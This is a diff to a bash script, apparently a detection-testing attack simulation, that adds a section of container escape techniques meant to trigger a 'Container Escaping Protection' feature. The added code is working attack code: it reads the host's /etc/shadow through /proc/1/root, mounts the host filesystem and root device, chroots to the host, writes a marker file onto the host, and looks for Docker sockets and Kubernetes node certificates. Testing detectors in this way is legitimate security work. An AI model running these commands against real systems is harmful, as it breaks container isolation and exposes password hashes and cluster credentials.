@@ -148,6 +148,79 @@ else
 fi
 echo ""
 
+# ── 2.7 Advanced escape techniques (trigger Container Escaping Protection) ──
+echo "> 2.7 - Advanced container escape techniques"
+
+# Direct /proc/1/root access (classic escape vector)
+echo "  [*] Accessing host root via /proc/1/root..."
+remote_exec "ls /proc/1/root/etc/hostname 2>/dev/null && cat /proc/1/root/etc/hostname" > /dev/null 2>&1
+echo "  [*] Reading host /etc/shadow via /proc/1/root..."
+SHADOW=$(remote_exec "head -3 /proc/1/root/etc/shadow 2>/dev/null")
+if [ -n "$SHADOW" ]; then
+    echo "  [OK] /proc/1/root/etc/shadow readable"
+    echo "$SHADOW" | head -2 | sed 's/^/    /'
+fi
+
+# Mount host filesystem from within container (triggers Container Escaping Protection)
+echo "  [*] Mounting host filesystem (privileged escape via mount)..."
+remote_exec "mkdir -p /tmp/hostfs" > /dev/null 2>&1
+MOUNT_OUT=$(remote_exec "mount -t tmpfs tmpfs /tmp/hostfs 2>&1; echo EXIT_CODE=\$?")
+echo "  Mount tmpfs: $MOUNT_OUT"
+# Try multiple mount techniques to trigger detection
+remote_exec "mount --bind /proc/1/root /tmp/hostfs 2>/dev/null"
+remote_exec "mount -t proc proc /proc/1/root/proc 2>/dev/null"
+remote_exec "mount -t sysfs sysfs /proc/1/root/sys 2>/dev/null"
+# Try to mount the host root device
+ROOTDEV=$(remote_exec "cat /proc/1/root/etc/fstab 2>/dev/null | grep -v ^# | head -1 | awk '{print \$1}'")
+if [ -n "$ROOTDEV" ]; then
+    echo "  [*] Trying to mount host root device: $ROOTDEV"
+    remote_exec "mount $ROOTDEV /tmp/hostfs 2>/dev/null"
+fi
+echo "  [OK] Mount operations executed"
+echo ""
+
+# chroot to host (another classic escape technique)
+echo "  [*] Attempting chroot to host root..."
+CHROOT_TEST=$(remote_exec "chroot /proc/1/root hostname 2>/dev/null")
+if [ -n "$CHROOT_TEST" ]; then
+    echo "  [OK] chroot to host succeeded: $CHROOT_TEST"
+else
+    CHROOT_TEST=$(remote_exec "chroot /host hostname 2>/dev/null")
+    if [ -n "$CHROOT_TEST" ]; then
+        echo "  [OK] chroot to /host succeeded: $CHROOT_TEST"
+    else
+        echo "  [--] chroot not available"
+    fi
+fi
+echo ""
+
+# Write to host filesystem (evidence of escape)
+echo "  [*] Writing escape marker to host /tmp..."
+remote_exec "date > /proc/1/root/tmp/.escape-marker 2>/dev/null"
+MARKER=$(remote_exec "cat /proc/1/root/tmp/.escape-marker 2>/dev/null")
+if [ -n "$MARKER" ]; then
+    echo "  [OK] Write to host filesystem confirmed: $MARKER"
+fi
+
+# Access Docker/containerd socket
+echo "  [*] Checking container runtime sockets..."
+DOCKER_SOCK=$(remote_exec "ls -la /proc/1/root/var/run/docker.sock /proc/1/root/run/containerd/containerd.sock 2>/dev/null")
+if [ -n "$DOCKER_SOCK" ]; then
+    echo "  [OK] Container runtime socket found:"
+    echo "$DOCKER_SOCK" | sed 's/^/    /'
+else
+    echo "  [--] No docker.sock/containerd.sock accessible"
+fi
+
+# Read K8s PKI (sensitive certs)
+echo "  [*] Reading K8s node certificates..."
+K8S_CERTS=$(remote_exec "ls /proc/1/root/var/lib/kubelet/pki/ 2>/dev/null || ls /host/var/lib/kubelet/pki/ 2>/dev/null")
+if [ -n "$K8S_CERTS" ]; then
+    echo "  [OK] K8s PKI certs accessible:"
+    echo "$K8S_CERTS" | sed 's/^/    /'
+fi
+echo ""
+
 # ── Summary ─────────────────────────────────
 echo "================================================"
 echo "  [OK] Container escape successful!"
